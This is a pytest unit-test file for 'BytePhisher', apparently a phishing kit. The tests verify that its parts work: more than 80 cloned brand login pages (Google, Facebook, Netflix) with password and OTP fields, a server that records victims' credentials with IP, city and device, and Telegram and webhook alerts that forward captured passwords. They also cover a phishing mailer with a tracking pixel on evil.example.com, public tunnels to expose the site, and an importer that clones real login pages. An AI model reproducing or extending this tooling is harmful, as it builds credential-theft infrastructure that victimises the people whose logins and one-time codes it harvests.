"""BytePhisher unit tests — every module, no network, no external services.

Run:  ./.venv/bin/python -m pytest tests/test_units.py -v
"""
import contextlib
import json
import os
import sqlite3
import sys
import tempfile
import threading

import pytest
from conftest import TEMPLATES, free_port

import mailer
from core import alerts
from core import capture as cap
from core import server as srv
from core import templates as tpl
from tunnels import REGISTRY, Tunneler, running, stop_all

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.unit



# ---------------------------------------------------------------- helpers ----
def tmpl_dir(idx=3):
    man = json.load(open(os.path.join(TEMPLATES, "templates.json")))
    # the manifest stores dirs relative to the templates root (portable); the
    # raw file is read here, so resolve before handing the path to render_site
    return tpl.resolve_dir([t for t in man if t["index"] == idx][0]["dir"], TEMPLATES), man


# ============================================================ body parsing ===
class TestBodyParsing:
    def test_urlencoded(self):
        raw = b"email=v%40example.com&password=p%40ss+word&_tpl=google"
        f = srv._extract_fields(raw, "application/x-www-form-urlencoded")
        assert f == {"email": "v@example.com", "password": "p@ss word", "_tpl": "google"}

    def test_urlencoded_unicode(self):
        raw = "email=üser@example.com&password=पासवर्ड".encode()
        f = srv._extract_fields(raw, "application/x-www-form-urlencoded")
        assert f["email"] == "üser@example.com"
        assert f["password"] == "पासवर्ड"

    def test_multipart(self):
        boundary = "----bpf123"
        raw = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="email"\r\n\r\n'
            "multi@example.com\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="password"\r\n\r\n'
            "Mult1Part!\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        f = srv._extract_fields(raw, f"multipart/form-data; boundary={boundary}")
        assert f["email"] == "multi@example.com"
        assert f["password"] == "Mult1Part!"

    def test_multipart_skips_file_uploads(self):
        boundary = "----bpfx"
        raw = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="email"\r\n\r\n'
            "a@b.com\r\n"
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="resume"; filename="cv.pdf"\r\n'
            "Content-Type: application/pdf\r\n\r\n"
            "%PDF-1.4 binary\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        f = srv._extract_fields(raw, f"multipart/form-data; boundary={boundary}")
        assert f == {"email": "a@b.com"}      # file part dropped

    def test_json_body(self):
        raw = json.dumps({"email": "j@x.com", "password": "J1!", "meta": {"a": 1}}).encode()
        f = srv._extract_fields(raw, "application/json; charset=utf-8")
        assert f["email"] == "j@x.com" and f["password"] == "J1!"
        assert json.loads(f["meta"]) == {"a": 1}

    def test_json_malformed_is_empty(self):
        assert srv._extract_fields(b"{not json", "application/json") == {}

    def test_empty_body(self):
        assert srv._extract_fields(b"", "application/x-www-form-urlencoded") == {}


# ======================================================== cred detection ======
class TestCredDetection:
    @pytest.mark.parametrize("fields", [
        {"email": "a@b.com", "password": "x"},
        {"username": "bob", "password": "x"},
        {"login": "bob", "pwd": "x"},
        {"user_name": "bob", "pass_code": "x"},
        {"Email": "a@b.com", "Password": "x"},          # case-insensitive
        {"email_or_username": "bob", "password_confirmation": "x"},
    ])
    def test_credentials_positive(self, fields):
        assert srv._is_creds(fields) is True

    @pytest.mark.parametrize("fields", [
        {"email": "a@b.com"},                            # no password
        {"password": "x"},                               # no identifier
        {"otp_1": "1", "otp_2": "2"},                    # OTP page only
        {"_tpl": "google", "_ts": "4100"},
        {},
    ])
    def test_credentials_negative(self, fields):
        assert srv._is_creds(fields) is False


# ========================================================= device detect =====
class TestDeviceDetect:
    def _h(self, geo="off"):
        return srv.make_handler(TEMPLATES, ":memory:", geo_provider=geo)

    @pytest.mark.parametrize("ua,expect", [
        ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)", "ios"),
        ("Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X)", "ios"),
        ("Mozilla/5.0 (Linux; Android 14; Pixel 8)", "android"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "macos"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "windows"),
        ("Mozilla/5.0 (X11; Linux x86_64)", "linux"),
        ("curl/8.4.0", "unknown"),
        ("", "unknown"),
    ])
    def test_ua_classification(self, ua, expect):
        H = self._h()
        # instantiate without __init__ (we only call _device, no socket needed)
        inst = H.__new__(H)
        assert inst._device(ua) == expect


# ============================================================== capture DB ===
class TestCaptureDB:
    @pytest.fixture()
    def db(self):
        path = os.path.join(tempfile.mkdtemp(), "t.db")
        d = cap.CaptureDB(path)
        yield d
        d.close()

    def test_record_and_read(self, db):
        db.record("/", "1.2.3.4", "Delhi", "India", "Airtel", "UA", "android",
                  {"email": "a@b.com", "password": "x"}, True)
        rows = db.all()
        assert len(rows) == 1
        r = rows[0]
        assert r["ip"] == "1.2.3.4" and r["city"] == "Delhi" and r["device"] == "android"
        assert r["fields"]["password"] == "x" and r["is_cred"] is True

    def test_stats(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios", {"email": "a", "password": "b"}, True)
        db.record("/otp", "1.1.1.1", "", "", "", "UA", "ios", {"otp_1": "1"}, False)
        db.log_visit("9.9.9.9", "UA2")
        st = db.stats()
        assert st["total_captures"] == 2 and st["credentials"] == 1 and st["visitors"] == 2

    def test_visitor_dedupe(self, db):
        for _ in range(5):
            db.log_visit("7.7.7.7", "UA-SAME")
        st = db.stats()
        assert st["visitors"] == 1
        hits = db.conn.execute("SELECT hits FROM visitors WHERE ip='7.7.7.7'").fetchone()[0]
        assert hits == 5

    def test_unicode_and_huge_fields(self, db):
        big = "A" * 10000
        db.record("/", "2.2.2.2", "Ünïcödé", "日本", "ISP", "UA", "macos",
                  {"email": "ü@example.com", "password": big, "note": "😀"}, True)
        r = db.all()[0]
        assert r["fields"]["password"] == big
        assert r["fields"]["note"] == "😀" and r["country"] == "日本"

    def test_newest_first(self, db):
        db.record("/1", "1.1.1.1", "", "", "", "UA", "ios", {"email": "1", "password": "1"}, True)
        db.record("/2", "1.1.1.2", "", "", "", "UA", "ios", {"email": "2", "password": "2"}, True)
        assert db.all()[0]["fields"]["email"] == "2"

    def test_limit(self, db):
        for i in range(10):
            db.record("/", f"1.1.1.{i}", "", "", "", "UA", "ios", {"email": str(i)}, False)
        assert len(db.all(limit=4)) == 4

    def test_csv_export(self, db):
        db.record("/", "3.3.3.3", "Mumbai", "India", "Jio", "UA", "android",
                  {"email": "csv@example.com", "password": "p,w\"q"}, True)
        out = os.path.join(tempfile.mkdtemp(), "out.csv")
        db.export_csv(out)
        text = open(out).read()
        assert "csv@example.com" in text and "YES" in text
        import csv as _csv
        row = list(_csv.DictReader(open(out)))[0]
        assert row["city"] == "Mumbai" and row["is_cred"] == "YES"

    def test_concurrent_writes_are_threadsafe(self, db):
        import threading
        def worker(n):
            for i in range(25):
                db.record("/", f"10.0.0.{n}", "", "", "", "UA", "ios",
                          {"email": f"{n}-{i}", "password": "x"}, True)
        ts = [threading.Thread(target=worker, args=(n,)) for n in range(4)]
        [t.start() for t in ts]
        [t.join() for t in ts]
        assert db.stats()["total_captures"] == 100


# ============================================================ templates ======
def generated_sites():
    """Only the sites produced by tools/gen_templates.py (custom imports are
    allowed to use their own field names and markup)."""
    from tools import gen_templates
    slugs = {s[0] for s in gen_templates.SITES}
    man = json.load(open(os.path.join(TEMPLATES, "templates.json")))
    return [t for t in man if t["slug"] in slugs]


class TestTemplates:
    def test_manifest_has_at_least_80_unique_sites(self):
        man = json.load(open(os.path.join(TEMPLATES, "templates.json")))
        # 80 generated sites; imported custom templates may add more
        assert len(man) >= 80
        slugs = [t["slug"] for t in man]
        assert len(set(slugs)) == len(slugs)
        for must in ("facebook", "google", "netflix", "cloudflare"):
            assert must in slugs

    def test_every_site_renders_with_required_elements(self):
        failures = []
        for t in generated_sites():
            html = tpl.render_site(tpl.resolve_dir(t["dir"], TEMPLATES), "/", False)
            for needle in ['name="password"', 'method="POST"', 'name="_tpl"', "hp_email"]:
                if needle not in html:
                    failures.append(f'{t["slug"]}: missing {needle}')
            if len(html) < 500:
                failures.append(f'{t["slug"]}: suspiciously short ({len(html)} bytes)')
        assert failures == [], failures

    def test_otp_page_for_every_site(self):
        for t in generated_sites():
            html = tpl.render_site(tpl.resolve_dir(t["dir"], TEMPLATES), "/", True)
            assert html.count('name="otp_') == 6, t["slug"]

    def test_site_branding_differs_between_templates(self):
        a = tpl.render_site(tmpl_dir(1)[0], "/", False)   # facebook
        b = tpl.render_site(tmpl_dir(3)[0], "/", False)   # google
        assert "Facebook" in a and "Google" in b and a != b

    def test_missing_index_html(self):
        empty = tempfile.mkdtemp()
        html = tpl.render_site(empty, "/", False)
        assert "404" in html

    def test_thankyou_page(self):
        html = tpl.render_thankyou()
        assert "Thank you" in html and "<html" in html

    def test_fields_json_present_and_valid(self):
        for t in generated_sites():
            fj = json.load(open(os.path.join(tpl.resolve_dir(t["dir"], TEMPLATES), "fields.json")))
            assert "capture_fields" in fj and "password" in fj["capture_fields"]
            assert fj["honeypot"] == "hp_email"

    def test_jinja_rendering_path(self):
        d = tempfile.mkdtemp()
        open(os.path.join(d, "index.html"), "w").write("Hi {{ site_name }}!")
        assert "Hi " in tpl.render_site(d, "/", False)


# ============================================================== mailer =======
class TestMailer:
    def test_all_templates_render_variables(self):
        for name in mailer.TEMPLATES:
            subject, body = mailer.render(name, {
                "To_FirstName": "Suraj", "To_Address": "s@example.com",
                "Phish_URL": "https://x.example.com", "From_Name": "IT",
                "Location": "Mumbai", "Doc_Name": "d.pdf", "Invoice_ID": "INV-1"})
            assert "{{" not in subject and "{{" not in body
            assert "https://x.example.com" in body
            assert subject.strip()

    def test_unknown_template_raises(self):
        with pytest.raises(KeyError):
            mailer.render("nope", {})

    def test_tracking_pixel(self):
        px = mailer.tracking_pixel("https://evil.example.com/")
        assert 'src="https://evil.example.com/px.gif"' in px

    def test_to_html_embeds_pixel_and_escapes(self):
        html = mailer.to_html("Hi <b>there</b>\n\nhttps://x.example.com",
                              base="https://x.example.com", cta_label="Open")
        assert "&lt;b&gt;" in html                 # user text escaped
        assert "px.gif" in html
        assert 'href="https://x.example.com"' in html
        assert '>Open<' in html

    def test_to_html_without_base_has_no_pixel(self):
        assert "px.gif" not in mailer.to_html("hello")


# ============================================================== alerts =======
class TestAlerts:
    def test_format_capture_contains_key_data(self):
        text = alerts.format_capture({
            "ts": 1700000000, "template": "google", "ip": "5.6.7.8",
            "city": "Delhi", "country": "India", "isp": "Airtel",
            "device": "android", "is_cred": True,
            "fields": {"email": "a@b.com", "password": "pw"}})
        for needle in ["CREDENTIALS", "google", "5.6.7.8", "Delhi", "Airtel",
                       "android", "email=a@b.com", "password=pw"]:
            assert needle in text

    def test_format_capture_otp_is_not_cred(self):
        assert "FIELDS captured" in alerts.format_capture({"fields": {"otp_1": "1"}})

    def test_notifier_calls_webhook(self):
        from conftest import StubHTTP
        stub = StubHTTP()
        try:
            n = alerts.make_notifier(webhook=stub.url, async_=False)
            n({"ts": 1, "template": "t", "ip": "1.2.3.4", "fields": {"email": "e"},
               "is_cred": True})
            assert len(stub.received) == 1
            payload = json.loads(stub.received[0]["body"])
            assert payload["capture"]["ip"] == "1.2.3.4"
            assert "text" in payload and "content" in payload
        finally:
            stub.stop()

    def test_notifier_survives_dead_webhook(self):
        n = alerts.make_notifier(webhook="http://127.0.0.1:1/dead", async_=False)
        n({"fields": {}, "ip": "0.0.0.0"})   # must not raise

    def test_telegram_notifier_hits_stubbed_api(self):
        from conftest import StubHTTP
        stub = StubHTTP()
        old = alerts.TELEGRAM_API_BASE
        alerts.TELEGRAM_API_BASE = stub.url
        try:
            n = alerts.make_notifier(telegram="TOKEN123:CHAT456", async_=False)
            n({"ts": 1, "template": "google", "ip": "8.8.8.8",
               "fields": {"email": "a@b.com", "password": "x"}, "is_cred": True})
            assert len(stub.received) == 1
            assert "/botTOKEN123/sendMessage" in stub.received[0]["path"]
            payload = json.loads(stub.received[0]["body"])
            assert payload["chat_id"] == "CHAT456"
            assert "8.8.8.8" in payload["text"]
        finally:
            alerts.TELEGRAM_API_BASE = old
            stub.stop()

    def test_notifier_is_async_and_never_blocks(self):
        from conftest import StubHTTP
        stub = StubHTTP()
        try:
            n = alerts.make_notifier(webhook=stub.url, async_=True)
            import time
            t0 = time.time()
            for _ in range(5):
                n({"fields": {}, "ip": "1.1.1.1"})
            assert time.time() - t0 < 0.5        # fire-and-forget
            deadline = time.time() + 5
            while len(stub.received) < 5 and time.time() < deadline:
                time.sleep(0.05)
            assert len(stub.received) == 5
        finally:
            stub.stop()


# ========================================================== net helpers =====
class TestNetHelpers:
    """core/net.py: outbound calls must prefer IPv4 (a box with no IPv6 route
    fails with Errno 101 when a name answers with AAAA first)."""

    def test_ipv4_resolution_is_per_connection(self):
        """The IPv4 preference must not patch global state."""
        import socket as _socket

        from core import net as _net
        calls = []

        def fake_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
            calls.append(family)
            raise OSError("stop here - we only care which family was requested")

        orig = _socket.getaddrinfo
        _socket.getaddrinfo = fake_getaddrinfo
        try:
            with pytest.raises(OSError):
                _net._ipv4_create_connection(("example.test", 443), timeout=1)
        finally:
            _socket.getaddrinfo = orig
        assert calls == [_socket.AF_INET]

    def test_getaddrinfo_is_left_untouched(self):
        import socket as _socket

        from core import net as _net
        before = _socket.getaddrinfo
        with contextlib.suppress(Exception):
            _net.urlopen("http://127.0.0.1:1/", timeout=2)
        assert _socket.getaddrinfo is before, "global resolver must not be patched"

    def test_concurrent_calls_do_not_serialise(self):
        """A global lock here deadlocked the server against its own client."""
        import threading as _th
        import time as _t

        from core import net as _net
        started = []
        lock = _th.Lock()

        def worker():
            with lock:
                started.append(_t.time())
            with contextlib.suppress(Exception):
                _net.urlopen("http://127.0.0.1:1/", timeout=2)

        threads = [_th.Thread(target=worker) for _ in range(4)]
        [x.start() for x in threads]
        [x.join() for x in threads]
        assert len(started) == 4
        assert max(started) - min(started) < 1.0, "calls queued behind a global lock"

class TestTunnels:
    def test_registry_has_six(self):
        assert set(REGISTRY) == {"cloudflared", "ngrok", "localhost_run",
                                 "bore", "pinggy"}

    def test_stop_all_with_no_processes(self):
        # make the test independent of what ran before it in the same process
        from tunnels import stop_all as _sa
        _sa()
        assert stop_all() == 0
        assert running() == []

    def test_resolve_finds_python(self):
        t = Tunneler(8080)
        assert t._resolve(["python3", "python"]) is True
        assert os.path.isabs(t.bin_path)

    def test_resolve_missing_binary(self):
        t = Tunneler(8080)
        assert t._resolve(["definitely-not-a-real-binary-xyz"]) is False
        assert t.bin_path is None

    @pytest.mark.parametrize("name,url", [
        ("cloudflared", "https://calm-river-1234.trycloudflare.com"),
        ("ngrok", "https://a1b2c3.ngrok-free.app"),
        ("ngrok", "https://a1b2c3.ngrok.io"),
        ("localhost_run", "https://abc123.lhr.life"),
        ("bore", "bore.pub:41234"),
        ("pinggy", "tcp://abc.run.pinggy-free.link:41234"),
    ])
    def test_url_patterns_match_real_hostnames(self, name, url):
        import re
        cls = REGISTRY[name]
        assert re.search(cls.url_pattern, url), f"{name} pattern missed {url}"

    def test_every_adapter_implements_interface(self):
        for _name, cls in REGISTRY.items():
            t = cls(free_port())
            assert callable(t.ensure_binary) and callable(t.start)
            assert isinstance(t.name, str) and isinstance(t.url_pattern, str)
            assert t.bin_path is None

    def test_start_returns_none_when_binary_missing(self, monkeypatch):
        """A missing binary must fail soft, never raise — asserted unconditionally
        (the old version asserted nothing on a box where ngrok was installed)."""
        t = REGISTRY["ngrok"](free_port())
        monkeypatch.setattr(t, "_resolve", lambda names: False)   # pretend absent
        monkeypatch.setattr(t, "ensure_binary", lambda: False)
        assert t.start() is None
        assert t.reason                                   # and it explains why
        from tunnels import reason_for, run_one
        assert run_one("ngrok", free_port()) is None
        assert reason_for("ngrok")                        # CLI shows the reason

    def test_running_and_dead_names_track_children(self):
        """The CLI watchdog needs to know which tunneler died."""
        import tempfile
        import time as _t

        from tunnels import _bg, dead_names, running_names, stop_all
        d = tempfile.mkdtemp()
        alive_log = os.path.join(d, "alive.log")
        dies_log = os.path.join(d, "dies.log")
        stop_all()
        _bg([sys.executable, "-c", "import time; time.sleep(30)"], alive_log)
        _bg([sys.executable, "-c", "pass"], dies_log)
        _t.sleep(1.0)
        assert "alive" in running_names()
        assert "dies" in dead_names()
        assert "alive" not in dead_names()
        assert stop_all() >= 1
        assert running_names() == {}


# ================================================================= CLI =======
class TestCLI:
    def test_load_config_defaults_and_paths(self):
        import bytephisher as bp
        cfg = bp.load_config()
        assert cfg["port"] == 8080 and os.path.isabs(cfg["db_path"])
        assert cfg["geo_provider"] in ("ipapi", "ipinfo", "off")

    def test_resolve_template_by_index_and_slug(self):
        import bytephisher as bp
        man = bp.load_manifest()
        assert bp.resolve_template(man, "3")["slug"] == "google"
        assert bp.resolve_template(man, "google")["slug"] == "google"
        assert bp.resolve_template(man, "netflix")["index"] == 11

    def test_resolve_unknown_template_exits(self):
        import bytephisher as bp
        man = bp.load_manifest()
        with pytest.raises(SystemExit):
            bp.resolve_template(man, "no-such-site-xyz")

    def test_generator_is_deterministic(self):
        from tools import gen_templates
        assert len(gen_templates.SITES) >= 80
        assert len({s[0] for s in gen_templates.SITES}) == len(gen_templates.SITES)
        html, otp_html, fj = gen_templates.build_site("facebook", "Facebook",
                                                      "#1877F2", "#fff", "email", "code")
        assert 'name="email"' in html and 'name="password"' in html
        assert otp_html.count('name="otp_') == 6
        assert fj["capture_fields"] == ["email", "password"]


# ============================================================ campaigns ======
class TestCampaigns:
    @pytest.fixture()
    def db(self):
        d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "camp.db"))
        yield d
        d.close()

    def test_capture_is_tagged_with_campaign(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios",
                  {"email": "a@b.c", "password": "x"}, True, campaign="q3-payroll")
        assert db.all()[0]["campaign"] == "q3-payroll"

    def test_per_campaign_stats(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios", {"email": "1", "password": "1"},
                  True, campaign="alpha")
        db.record("/", "1.1.1.2", "", "", "", "UA", "ios", {"email": "2", "password": "2"},
                  True, campaign="beta")
        db.record("/", "1.1.1.3", "", "", "", "UA", "ios", {"otp_1": "1"}, False,
                  campaign="beta")
        assert db.stats(campaign="alpha")["total_captures"] == 1
        assert db.stats(campaign="beta")["total_captures"] == 2
        assert db.stats(campaign="beta")["credentials"] == 1
        assert db.stats()["total_captures"] == 3       # no filter = everything

    def test_campaign_breakdown(self, db):
        for c in ("alpha", "alpha", "beta"):
            db.record("/", "1.1.1.1", "", "", "", "UA", "ios",
                      {"email": "x", "password": "y"}, True, campaign=c)
        br = {r["campaign"]: r for r in db.campaigns()}
        assert br["alpha"]["captures"] == 2 and br["beta"]["captures"] == 1
        assert br["alpha"]["credentials"] == 2

    def test_untagged_capture_is_labelled(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios", {"email": "x"}, False)
        assert db.campaigns()[0]["campaign"] == "(untagged)"

    def test_filter_by_campaign_in_all(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios", {"email": "a"}, True, campaign="x")
        db.record("/", "1.1.1.2", "", "", "", "UA", "ios", {"email": "b"}, True, campaign="y")
        rows = db.all(campaign="x")
        assert len(rows) == 1 and rows[0]["fields"]["email"] == "a"

    def test_csv_export_has_campaign_column(self, db):
        db.record("/", "1.1.1.1", "", "", "", "UA", "ios",
                  {"email": "a", "password": "b"}, True, campaign="q3")
        out = os.path.join(tempfile.mkdtemp(), "c.csv")
        db.export_csv(out)
        import csv as _csv
        row = list(_csv.DictReader(open(out)))[0]
        assert row["campaign"] == "q3"

    def test_legacy_db_without_campaign_column_is_migrated(self):
        """A DB created by an older release (before campaign columns) must be upgraded in place."""
        path = os.path.join(tempfile.mkdtemp(), "legacy.db")
        raw = sqlite3.connect(path)
        raw.execute("""CREATE TABLE captures (id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL,
                       source_url TEXT, ip TEXT, city TEXT, country TEXT, isp TEXT, ua TEXT,
                       device TEXT, fields_json TEXT, is_cred INTEGER DEFAULT 0)""")
        raw.execute("""CREATE TABLE visitors (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT,
                       ua TEXT, first_seen REAL, hits INTEGER DEFAULT 1)""")
        raw.execute("INSERT INTO captures (ts, ip, fields_json, is_cred) VALUES (1,'1.2.3.4','{}',1)")
        raw.commit()
        raw.close()

        d = cap.CaptureDB(path)                       # must migrate, not crash
        d.record("/", "5.6.7.8", "", "", "", "UA", "ios",
                 {"email": "new@example.com", "password": "x"}, True, campaign="post-migration")
        rows = d.all()
        assert rows[0]["campaign"] == "post-migration"
        assert rows[1]["campaign"] == ""              # old row still readable
        d.close()


# ========================================================= custom import ====
class TestCustomImport:
    def test_form_scanner_extracts_inputs_and_actions(self):
        from tools.import_site import FormScanner
        s = FormScanner()
        s.feed(open(os.path.join("tests", "fixtures", "custom_login.html")).read())
        names = [n for n, _t, _p in s.inputs]
        assert "login_id" in names and "passwd" in names and "csrf" in names
        assert s.actions == ["/sso/authenticate"]

    def test_absolutize_rewrites_relative_urls(self):
        from tools.import_site import absolutize
        html = '<link href="/a.css"><script src="b.js"></script><a href="#x">y</a>'
        out = absolutize(html, "https://site.example/dir/page")
        assert 'href="https://site.example/a.css"' in out
        assert 'src="https://site.example/dir/b.js"' in out
        assert 'href="#x"' in out            # fragments untouched

    def test_neutralise_forms(self):
        from tools.import_site import neutralise_forms
        out = neutralise_forms('<form action="/sso/x" method="post">')
        assert 'action="/"' in out and 'method="POST"' in out
        out2 = neutralise_forms("<form>")
        assert 'action="/"' in out2

    def test_brand_colour_detection(self):
        from tools.import_site import brand_colour
        assert brand_colour("<style>a{color:#AB12CD}</style>") == "#AB12CD"
        assert brand_colour("no colours here", default="#123456") == "#123456"

    def test_import_local_file_creates_usable_template(self, tmp_path, monkeypatch):
        """Import into a throwaway templates dir so the real library is untouched."""
        import tools.import_site as imp
        fake_tpl = tmp_path / "templates"
        fake_tpl.mkdir()
        monkeypatch.setattr(imp, "TEMPLATES", str(fake_tpl))
        res = imp.import_site(file=os.path.join("tests", "fixtures", "custom_login.html"),
                              name="ACME SSO", slug="acme-sso", index=1)
        assert os.path.isfile(os.path.join(tpl.resolve_dir(res["dir"], TEMPLATES), "index.html"))
        assert os.path.isfile(os.path.join(tpl.resolve_dir(res["dir"], TEMPLATES), "otp.html"))
        fj = json.load(open(os.path.join(res["dir"], "fields.json")))
        assert "login_id" in fj["capture_fields"] and "passwd" in fj["capture_fields"]
        man = json.load(open(fake_tpl / "templates.json"))
        assert man[0]["slug"] == "acme-sso"

        # the imported page must satisfy the same contract as a generated one
        html = tpl.render_site(tpl.resolve_dir(res["dir"], TEMPLATES), "/", False)
        # the imported page keeps its own field names (no injected "password")
        assert 'name="passwd"' in html
        assert 'name="password"' not in html
        assert 'action="/"' in html
        assert "ACME" in html

    def test_imported_template_captures_credentials(self, tmp_path, monkeypatch):
        """Full loop: import -> serve -> POST -> row in SQLite."""
        import socket
        import threading
        import time as _t
        import urllib.parse
        import urllib.request

        import tools.import_site as imp
        fake_tpl = tmp_path / "templates"
        fake_tpl.mkdir()
        monkeypatch.setattr(imp, "TEMPLATES", str(fake_tpl))
        res = imp.import_site(file=os.path.join("tests", "fixtures", "custom_login.html"),
                              name="ACME SSO", slug="acme-sso", index=1)

        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        dbfile = tmp_path / "imp.db"
        httpd, _ = srv.serve(str(fake_tpl), res["dir"], port, str(dbfile),
                             geo_provider="off", campaign="acme")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        _t.sleep(0.4)
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{port}/",
                data=urllib.parse.urlencode({"login_id": "emp@acme.example",
                                             "passwd": "Acme1!", "csrf": "t"}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"})
            assert urllib.request.urlopen(req, timeout=10).status == 200
            _t.sleep(0.4)
            d = cap.CaptureDB(str(dbfile))
            rows = d.all()
            assert len(rows) == 1
            assert rows[0]["fields"]["login_id"] == "emp@acme.example"
            assert rows[0]["is_cred"] is True        # passwd counts as a password field
            assert rows[0]["campaign"] == "acme"
            d.close()
        finally:
            httpd.shutdown()


# ==================================================== tunneler diagnostics ====
class TestTunnelerDiagnostics:
    """A tunneler that fails must say WHY — 'FAILED' alone is useless on a
    live engagement. Verified live: Cloudflare returned HTTP 429 / error 1015
    for quick tunnels, and the CLI now prints that instead of a bare FAILED."""

    def _tunneler(self, name):
        cls = REGISTRY[name]
        return cls(0)

    def test_rate_limit_is_explained(self):
        t = self._tunneler("cloudflared")
        os.makedirs(os.path.dirname(t.log), exist_ok=True)
        with open(t.log, "w") as f:
            f.write("ERR Error unmarshaling QuickTunnel response: error code: 1015\n"
                    ' error="invalid character' + "'" + 'e' + "'" + ' looking for beginning of value"'
                    ' status_code="429 Too Many Requests"\n')
        why = t._explain_failure()
        assert "429" in why and "rate-limited" in why and t.reason == why

    def test_missing_authtoken_is_explained(self):
        t = self._tunneler("ngrok")
        os.makedirs(os.path.dirname(t.log), exist_ok=True)
        with open(t.log, "w") as f:
            f.write("ERROR: authentication failed: Your account is limited to 1 session\n"
                    "ERR_NGROK_4018\n")
        assert "authtoken" in t._explain_failure()

    def test_unreachable_service_is_explained(self):
        t = self._tunneler("bore")
        with open(t.log, "w") as f:
            f.write("error: Connection refused (os error 111)\n")
        assert "network" in t._explain_failure()

    def test_successful_log_produces_no_reason(self):
        t = self._tunneler("cloudflared")
        with open(t.log, "w") as f:
            f.write("INF +https://fine-tunnel.trycloudflare.com\n"
                    "INF Registered tunnel connection connIndex=0\n")
        assert t._explain_failure() == "" and t.reason == ""

    def test_reason_for_unknown_tunneler_is_empty(self):
        from tunnels import reason_for
        assert reason_for("does-not-exist") == ""


# ============================================== concurrency / thread safety ===
class TestConcurrencySafety:
    """Regression: one shared sqlite3 connection used by the HTTP server, the
    dashboard SSE generator and the TUI at the same time SEGFAULTED the process
    ('Fatal Python error: Segmentation fault ... core/capture.py in since()').
    The store now keeps one connection per thread and refuses work after close."""

    def test_parallel_readers_and_writers(self):
        path = os.path.join(tempfile.mkdtemp(), "conc.db")
        db = cap.CaptureDB(path)
        errors = []
        stop = threading.Event()

        def writer(i):
            try:
                for n in range(25):
                    db.record("/", f"10.0.0.{i}", "C", "IN", "ISP", f"UA{i}", "android",
                              {"email": f"u{i}-{n}@x.test", "password": "p"}, True,
                              campaign="conc", risk=0)
            except Exception as e:                       # pragma: no cover
                errors.append(f"writer {i}: {e}")

        def reader():
            try:
                while not stop.is_set():
                    db.all(limit=50)
                    db.stats()
                    db.since(0, limit=50)
                    db.campaigns()
                    db.max_id()
            except Exception as e:                       # pragma: no cover
                errors.append(f"reader: {e}")

        ws = [threading.Thread(target=writer, args=(i,)) for i in range(4)]
        rs = [threading.Thread(target=reader) for _ in range(6)]
        for t in rs + ws:
            t.start()
        for t in ws:
            t.join()
        stop.set()
        for t in rs:
            t.join()
        assert not errors, errors
        assert db.stats()["total_captures"] == 100
        db.close()

    def test_use_after_close_is_a_clean_error_not_a_crash(self):
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "closed.db"))
        db.record("/", "1.2.3.4", "C", "IN", "ISP", "UA", "android",
                  {"email": "a@b.c", "password": "p"}, True)
        db.close()
        with pytest.raises(RuntimeError):
            db.all()
        with pytest.raises(RuntimeError):
            db.record("/", "1.2.3.4", "C", "IN", "ISP", "UA", "android", {}, False)
        # the SSE feed tolerates a closed store instead of exploding
        assert db.since(0) == []

    def test_each_thread_gets_its_own_connection(self):
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "perthread.db"))
        main_conn = db.conn
        seen = []

        def other():
            seen.append(db.conn)

        t = threading.Thread(target=other)
        t.start()
        t.join()
        assert seen and seen[0] is not main_conn      # never shared across threads
        db.close()
